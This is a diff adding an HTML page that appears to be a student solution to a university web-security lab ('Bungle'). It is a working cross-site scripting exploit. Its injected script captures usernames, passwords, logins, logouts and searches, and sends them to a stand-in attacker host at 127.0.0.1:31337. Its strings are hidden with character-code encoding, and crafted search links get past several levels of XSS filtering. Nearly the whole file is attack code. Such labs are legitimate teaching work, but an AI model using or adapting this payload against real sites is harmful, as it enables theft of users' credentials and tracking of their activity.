@@ -1,0 +1,221 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+// Extend this function:
+function payload(attacker, target) {
+	function send_to_attacker(data) {
+		const stolen_str = String.fromCharCode(115,116,111,108,101,110);
+		$.ajax({
+			url: attacker + stolen_str,
+			data
+		});
+	}
+
+	const html_str = String.fromCharCode(104,116,109,108);
+	const root_str = String.fromCharCode(46,47);
+
+	function request_to_server(href, type, data) {
+		$.ajax({
+			url: target + href,
+			type,
+			data,
+			success: function(data) {
+				$(html_str).hide();
+				$(html_str).html(data);
+				register_events();
+				$(html_str).show();
+			}
+		});
+	}
+	
+	function register_events() {
+		const GET_str = String.fromCharCode(71,69,84);
+		const nav_str = String.fromCharCode(110,97,118);
+		const search_again_btn_id = String.fromCharCode(35,115,101,97,114,99,104,45,97,103,97,105,110,45,98,116,110);
+
+		$(search_again_btn_id).click(function(event) {
+			event.preventDefault();
+
+			const logged_in_user_id = String.fromCharCode(35,108,111,103,103,101,100,45,105,110,45,117,115,101,114);
+
+			const user = $(logged_in_user_id).text();
+			const url = target;
+
+			if (user) {
+				send_to_attacker({
+					event: nav_str,
+					user,
+					url
+				});
+			} else {
+				send_to_attacker({
+					event: nav_str,
+					url
+				});
+			}
+
+			request_to_server(root_str, GET_str);
+		});
+
+		const search_btn_id = String.fromCharCode(35,115,101,97,114,99,104,45,98,116,110);
+		const logged_in_user_id = String.fromCharCode(35,108,111,103,103,101,100,45,105,110,45,117,115,101,114);
+
+		const search_q_str = String.fromCharCode(34,47,115,101,97,114,99,104,63,113,61);
+		const search_str = String.fromCharCode(46,47,115,101,97,114,99,104);
+
+		$(search_btn_id).click(function(event) {
+			event.preventDefault();
+
+			const query_id = String.fromCharCode(35,113,117,101,114,121);
+
+			const content = $(query_id).val();
+
+			const user = $(logged_in_user_id).text();
+			const url = target + search_q_str + content;
+
+			if (user) {
+				send_to_attacker({
+					event: nav_str,
+					user,
+					url
+				});
+			} else {
+				send_to_attacker({
+					event: nav_str,
+					url
+				});
+			}
+
+			request_to_server(search_str, GET_str, {q: content});
+		});
+
+		const log_in_btn_id = String.fromCharCode(35,108,111,103,45,105,110,45,98,116,110);
+
+		const username_id = String.fromCharCode(35,117,115,101,114,110,97,109,101);
+		const userpass_id = String.fromCharCode(35,117,115,101,114,112,97,115,115);
+
+		const POST_str = String.fromCharCode(80,79,83,84);
+
+
+		$(log_in_btn_id).click(function(event) {
+			event.preventDefault();
+
+			const user = $(username_id).val();
+			const pass = $(userpass_id).val();
+
+			const login_str = String.fromCharCode(108,111,103,105,110)
+
+			send_to_attacker({
+				event: login_str,
+				user,
+				pass
+			});
+
+			// ./login
+			const login_str_2 = String.fromCharCode(46,47,108,111,103,105,110);
+
+			request_to_server(login_str_2, POST_str, {username: user, password: pass});
+		});
+
+		const log_out_btn_id = String.fromCharCode(35,108,111,103,45,111,117,116,45,98,116,110);
+
+		$(log_out_btn_id).click(function(event) {
+			event.preventDefault();
+
+			const user = $(logged_in_user_id).text();
+
+			const logout_str = String.fromCharCode(108,111,103,111,117,116);
+
+			send_to_attacker({
+				event: logout_str,
+				user
+			});
+
+			// ./logout
+			const logout_str_2 = String.fromCharCode(46,47,108,111,103,111,117,116);
+
+			request_to_server(logout_str_2, POST_str);
+		});
+
+		const new_account_btn_id = String.fromCharCode(35,110,101,119,45,97,99,99,111,117,110,116,45,98,116,110)
+
+		$(new_account_btn_id).click(function(event) {
+			event.preventDefault();
+
+			const user = $(username_id).val();
+			const pass = $(userpass_id).val();
+
+			const create_str = String.fromCharCode(99,114,101,97,116,101);
+
+			send_to_attacker({
+				event: create_str,
+				user,
+				pass
+			});
+
+			// ./create
+			const create_str_2 = String.fromCharCode(46,47,99,114,101,97,116,101);
+
+			request_to_server(create_str_2, POST_str, {username: user, password: pass});
+		});
+
+
+		const history_class = String.fromCharCode(97,46,104,105,115,116,111,114,121,45,105,116,101,109,46,108,105,115,116,45,103,114,111,117,112,45,105,116,101,109);
+
+		$(history_class).click(function(event) {
+			event.preventDefault();
+
+			const content = $(this).text();
+
+			const user = $(logged_in_user_id).text();
+			const url = target + search_q_str + content;
+
+			send_to_attacker({
+				event: nav_str,
+				user,
+				url
+			});
+
+			request_to_server(search_str, GET_str, {q: content});
+		});
+	}
+
+	$(html_str).hide();
+	$(html_str).load(root_str, function() {
+		register_events();
+		$(html_str).show();
+	});
+}
+
+function makeLink(xssdefense, target, attacker) {
+	if (xssdefense == 0) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent("<script" + ">" + payload.toString() +
+			";payload(\"" + attacker + "\", \"" + target + "\");</script" + ">");
+	} else if (xssdefense == 1) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent("<scrscriptipt" + ">" + payload.toString() +
+			";payload(\"" + attacker + "\", \"" + target + "\");</scrscriptipt" + ">");
+	} else if (xssdefense == 2) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent("<scrscriptipt" + ">" + payload.toString() +
+			";payload(\"" + attacker + "\", \"" + target + "\");</scrscriptipt" + ">");
+	} else if (xssdefense == 3) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent("<script" + ">" + payload.toString() +
+			"\nconst attacker_str = String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,51,49,51,51,55,47)" +
+			"\nconst target_str = String.fromCharCode(104,116,116,112,58,47,47,99,115,53,50,54,45,115,49,56,46,99,115,46,112,117,114,100,117,101,46,101,100,117,47,112,114,111,106,101,99,116,51,47)" +
+			"\npayload(attacker_str,target_str)</script" + ">");
+	}
+}
+
+var xssdefense = 3;
+var target = "http://cs526-s18.cs.purdue.edu/project3/";
+var attacker = "http://127.0.0.1:31337/";
+
+$(function() {
+	var url = makeLink(xssdefense, target, attacker);
+	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+</script>
+<h3></h3>
